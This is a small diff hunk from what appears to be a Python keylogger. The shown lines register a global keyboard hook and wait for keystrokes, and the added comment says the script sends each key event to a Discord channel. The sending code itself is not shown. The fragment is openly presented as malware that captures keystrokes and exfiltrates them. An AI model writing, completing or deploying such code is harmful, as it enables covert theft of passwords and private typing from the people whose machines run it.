@@ -14,3 +14,5 @@ def on_key_press(event):
     
 keyboard.on_press(on_key_press)
 keyboard.wait()
+
+#A keylogger which triggers when a being pressed asnd send each event to your discord channel 
